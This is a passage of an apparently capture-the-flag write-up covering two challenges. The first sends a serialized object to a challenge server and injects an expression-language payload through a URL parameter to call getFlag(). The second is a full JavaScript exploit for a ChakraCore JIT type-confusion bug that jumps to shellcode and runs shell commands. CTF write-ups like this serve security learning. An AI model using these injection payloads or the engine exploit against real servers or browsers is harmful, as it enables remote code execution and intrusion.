+}</code></pre><pre class="hljs"><code><span class="hljs-keyword">import</span> requests
+
+<span class="hljs-title">with</span> open(<span class="hljs-string">"name.ser"</span>) <span class="hljs-keyword">as</span> f:
+    x  = f.read()
+<span class="hljs-title">r</span> = requests.post(<span class="hljs-string">"http://flagmarshal.xyz/jail"</span>, <span class="hljs-class"><span class="hljs-keyword">data</span>=x, headers={'<span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>': '<span class="hljs-title">application</span>/<span class="hljs-title">x</span>-<span class="hljs-title">www</span>-<span class="hljs-title">form</span>-<span class="hljs-title">urlencoded'</span>})</span>
+<span class="hljs-title">print</span> r.text</code></pre><p>=&gt; <code>Sorry Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain. I cannot let you have the Flag!.</code></p>
+<p>And run the <code>getFlag()</code>: <a href="http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=&#39;%2bT(com.trendmicro.jail.Flag).getFlag()%2b&#39;">http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=&#39;%2bT(com.trendmicro.jail.Flag).getFlag()%2b&#39;</a></p>
+<p class="img-container"><img src="https://github.com/w181496/CTF/raw/master/trendmicro-ctf-2019/forensics300/trend.png" alt=""></p>
+<p><code>TMCTF{F0OlLM3TwIcE1Th@Tz!N1C3}</code></p>
+<h3 id="400"><a class="header-link" href="#400"></a>400</h3>
+<p>We were asked to pwn a modified ChakraCore Javascript engine. By looking at the diff file:</p>
+<pre class="hljs"><code>diff --git a/lib/Backend/GlobOptFields.cpp b/lib/Backend/GlobOptFields.cpp
+index 88bf72d32..6fcb61151 100644
+<span class="hljs-comment">--- a/lib/Backend/GlobOptFields.cpp</span>
+<span class="hljs-comment">+++ b/lib/Backend/GlobOptFields.cpp</span>
+@@ -564,7 +564,7 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse&lt;JitArenaAllocator&gt; *bv, bo
+         break;
+
+     case Js::OpCode::InitClass:
+<span class="hljs-deletion">-    case Js::OpCode::InitProto:</span>
+<span class="hljs-addition">+    //case Js::OpCode::InitProto:</span>
+     case Js::OpCode::NewScObjectNoCtor:
+     case Js::OpCode::NewScObjectNoCtorFull:
+         if (inGlobOpt)
+</code></pre><p>We can see that the <code>InitProto</code> opcode has been commented out inside the <a href="https://github.com/microsoft/ChakraCore/blob/master/lib/Backend/GlobOptFields.cpp#L291">ProcessFieldKills</a> function, making the engine think that the <code>InitProto</code> opcode will not have side effects while doing JIT, which may lead to type confusion in the JITed code.</p>
+<p>By searching the internet, we found that there&#39;s already a <a href="https://packetstormsecurity.com/files/151219/Microsoft-Edge-Chakra-JIT-NewScObjectNoCtor-InitProto-Type-Confusion.html">PoC</a> for this vulnerability. So we just downloaded the PoC and started modifying the code. After hours of trying/debugging, we finally managed to let the js engine jump to our shellcode ( the binary has no DEP protection ). The rest is simple: first we execute <code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ls&quot;])</code> to get the file list in the challenge directory. After we saw the <code>flag</code> file, we just execute <code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat flag&quot;])</code> to get the flag.</p>
+<p>Exploit:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">opt</span>(<span class="hljs-params">o, proto, value</span>) </span>{
+    o.b = <span class="hljs-number">0x1337</span>;
+    <span class="hljs-keyword">let</span> tmp = {<span class="hljs-attr">__proto__</span>: proto};
+    o.a = value;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20000</span>; i++) {
+        <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span>};
+        opt(o, {}, {});
+    }
+
+    <span class="hljs-keyword">let</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span>};
+    <span class="hljs-keyword">let</span> leak = {<span class="hljs-attr">z</span>: {}, <span class="hljs-attr">x</span>: {}};
+    <span class="hljs-keyword">let</span> oo = {<span class="hljs-attr">c</span>: <span class="hljs-number">0xdead</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">0xbeef</span>};
+    <span class="hljs-comment">// trigger vulnerability</span>
+    <span class="hljs-comment">// auxSlots pointer will be corrupted</span>
+    opt(o, o, oo);
+
+    <span class="hljs-comment">// allocate some memory ( fill the gape )</span>
+    <span class="hljs-keyword">let</span> s = {};
+    <span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1000</span>);
+    <span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buf);
+    <span class="hljs-keyword">var</span> buf2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1000</span>);
+    <span class="hljs-keyword">var</span> shellcode2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buf2);
+    <span class="hljs-comment">// allocate our shellcode buffer</span>
+    <span class="hljs-keyword">var</span> buf3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1000</span>);
+    <span class="hljs-keyword">var</span> shellcode3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(buf3);
+    <span class="hljs-comment">// write our shellcode</span>
+    <span class="hljs-comment">// shellcode3[0] = 0x90909090;</span>
+    <span class="hljs-comment">// shellcode3[1] = 0x90909090;</span>
+    <span class="hljs-comment">// .....................</span>
+
+    <span class="hljs-keyword">let</span> ddd = {<span class="hljs-attr">x</span>:shellcode, <span class="hljs-attr">y</span>:shellcode};
+    oo.c = shellcode;
+    o.a = shellcode;
+    <span class="hljs-comment">// oo.c = 0x9447 will execute "call [rax+0xb8]" in the end</span>
+    <span class="hljs-comment">// while [rax+0xb8] == shellcode3's buffer address</span>
+    oo.c = <span class="hljs-number">0x9447</span>;
+}
+main();</code></pre><p>Flag:<code>TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
